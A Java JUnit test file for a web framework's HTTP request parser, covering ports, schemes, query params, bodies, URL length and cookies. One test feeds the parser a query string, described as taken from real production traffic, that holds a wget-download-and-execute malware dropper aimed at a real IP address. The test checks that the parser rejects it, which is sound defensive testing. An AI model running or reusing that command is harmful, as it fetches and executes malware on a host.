package core.framework.internal.web.request;

import core.framework.http.ContentType;
import core.framework.log.ErrorCode;
import core.framework.util.Strings;
import core.framework.web.exception.BadRequestException;
import core.framework.web.exception.MethodNotAllowedException;
import io.undertow.server.HttpServerExchange;
import io.undertow.server.ServerConnection;
import io.undertow.server.handlers.CookieImpl;
import io.undertow.util.Headers;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.xnio.OptionMap;

import java.io.IOException;
import java.util.ArrayDeque;
import java.util.Deque;
import java.util.List;
import java.util.Map;

import static java.net.URLEncoder.encode;
import static java.nio.charset.StandardCharsets.UTF_8;
import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.assertj.core.api.Assertions.entry;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

/**
 * @author neo
 */
class RequestParserTest {
    private RequestParser parser;

    @BeforeEach
    void createRequestParser() {
        parser = new RequestParser();
    }

    @Test
    void port() {
        assertThat(parser.port(80, null)).isEqualTo(80);
        assertThat(parser.port(80, "443")).isEqualTo(443);
        assertThat(parser.port(80, "443, 80")).isEqualTo(443);
    }

    @Test
    void scheme() {
        assertThat(parser.scheme("http", "https")).isEqualTo("https");
        assertThat(parser.scheme("http", null)).isEqualTo("http");
    }

    @Test
    void requestPort() {
        assertThat(parser.requestPort("127.0.0.1", "https", null)).isEqualTo(443);
        assertThat(parser.requestPort("127.0.0.1:8080", "http", null)).isEqualTo(8080);
        assertThat(parser.requestPort("[::1]:8080", "http", null)).isEqualTo(8080);
    }

    @Test
    void httpMethod() {
        assertThatThrownBy(() -> parser.httpMethod("TRACK"))
            .isInstanceOf(MethodNotAllowedException.class)
            .hasMessageContaining("method=TRACK");
    }

    @Test
    void hostName() {
        assertThat(parser.hostName("proxy", "original")).isEqualTo("original");
        assertThat(parser.hostName("original", null)).isEqualTo("original");
    }

    @Test
    void parseQueryParams() {
        var request = new RequestImpl(null, null);
        // undertow url decoding is disabled in core.framework.internal.web.HTTPServer.start, so the parser must decode all query param
        Map<String, Deque<String>> params = Map.of("key", new ArrayDeque<>(List.of(encode("value1 value2", UTF_8))),
            "emptyKey", new ArrayDeque<>(List.of("")));  // for use case: http://address?emptyKey=
        parser.parseQueryParams(request, params);

        assertThat(request.queryParams()).containsOnly(entry("key", "value1 value2"), entry("emptyKey", ""));
    }

    @Test
    void parseQueryParamsWithInvalidValue() {
        var request = new RequestImpl(null, null);

        // the query string is from actual cases of production
        Map<String, Deque<String>> params = Map.of("cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo", new ArrayDeque<>());
        assertThatThrownBy(() -> parser.parseQueryParams(request, params))
            .isInstanceOf(BadRequestException.class)
            .hasMessageContaining("failed to parse query param");
    }

    @Test
    void parseBody() throws Throwable {
        var request = new RequestImpl(null, null);
        request.contentType = ContentType.TEXT_XML;
        var exchange = new HttpServerExchange(null, -1);
        byte[] body = Strings.bytes("<xml/>");
        exchange.putAttachment(RequestBodyReader.REQUEST_BODY, new RequestBodyReader.RequestBody(body, null));
        parser.parseBody(request, exchange);

        assertThat(request.body()).hasValue(body);
    }

    @Test
    void failedToReadBody() {
        var request = new RequestImpl(null, null);
        var exchange = new HttpServerExchange(null, -1);
        exchange.putAttachment(RequestBodyReader.REQUEST_BODY, new RequestBodyReader.RequestBody(null, new IOException()));

        assertThatThrownBy(() -> parser.parseBody(request, exchange))
            .isInstanceOf(BadRequestException.class)
            .satisfies(e -> assertThat(((ErrorCode) e).errorCode()).isEqualTo("FAILED_TO_READ_HTTP_REQUEST"));
    }

    @Test
    void requestURL() {
        var exchange = new HttpServerExchange(null, -1);
        exchange.setRequestURI("/path");
        exchange.setQueryString("key=value");
        var request = new RequestImpl(exchange, null);
        request.scheme = "https";
        request.hostName = "localhost";
        request.port = 443;

        assertThat(parser.requestURL(request, exchange))
            .isEqualTo("https://localhost/path?key=value");
    }

    @Test
    void requestURLIsTooLong() {
        var exchange = new HttpServerExchange(null, -1);
        exchange.getRequestHeaders().put(Headers.HOST, "localhost");
        exchange.setRequestURI("/path");

        var builder = new StringBuilder(1000);
        for (int i = 0; i < 100; i++) {
            builder.append("1234567890");
        }
        exchange.setQueryString(builder.toString());
        RequestImpl request = new RequestImpl(exchange, null);
        request.scheme = "http";
        request.port = 80;
        assertThatThrownBy(() -> parser.requestURL(request, exchange))
            .isInstanceOf(BadRequestException.class)
            .hasMessageContaining("requestURL is too long");
    }

    @Test
    void parseCookies() {
        Map<String, String> cookies = parser.decodeCookies(Map.of("name", new CookieImpl("name", "value")));
        assertThat(cookies).containsEntry("name", "value");
    }

    @Test
    void parseInvalidCookie() {
        ServerConnection connection = mock(ServerConnection.class);
        when(connection.getUndertowOptions()).thenReturn(OptionMap.EMPTY);
        var exchange = new HttpServerExchange(connection, -1);
        exchange.getRequestHeaders().put(Headers.COOKIE, "name=invalid-" + (char) 232);

        assertThatThrownBy(() -> parser.parseCookies(new RequestImpl(null, null), exchange))
            .isInstanceOf(BadRequestException.class);
    }

    @Test
    void decodeInvalidCookieValue() {
        Map<String, String> cookies = parser.decodeCookies(Map.of("name", new CookieImpl("name", "%%")));
        assertThat(cookies).isEmpty();
    }
}
